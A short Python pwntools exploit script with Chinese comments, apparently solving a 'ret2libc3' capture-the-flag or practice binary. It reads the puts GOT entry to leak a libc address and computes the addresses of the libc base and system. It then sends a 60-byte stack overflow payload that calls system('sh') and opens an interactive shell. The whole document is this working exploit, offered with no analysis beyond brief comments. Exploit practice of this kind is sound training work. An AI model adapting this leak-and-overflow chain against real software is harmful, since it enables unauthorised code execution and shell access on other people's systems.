from pwn import *

elf = ELF("./ret2libc3")
elf_libc = ELF("./libc.so.6")

sh = process("./ret2libc3")
sh.recv()       # 接收puts和printf

puts_got = elf.got['puts']  # puts的十进制地址: 134520860
# See_something(v8);  获取puts实际地址
sh.send(str(puts_got))      # 接受端要ASCII码
sh.recvuntil(b': ')       # b'The content of the address : 0xf7c73200\nLeave some message for me :'
puts_addr = int(sh.recvuntil(b'\n', drop = True), 16)
print("puts_addr: %d"  %puts_addr)
# sh.recv()

libc_base = puts_addr -  elf_libc.symbols['puts']
system_addr = ( libc_base + elf_libc.symbols['system'])

print("libc_base: %d " %libc_base)
print("system_addr: %d" %system_addr)
print("system_addr - puts_addr: %d" %(system_addr - puts_addr))

payload = flat(cyclic(60) , system_addr, 'b'*4, next(elf.search(b"sh\x00")))
sh.sendlineafter(b"for me :", payload)
# sh.sendline(payload)
sh.interactive()
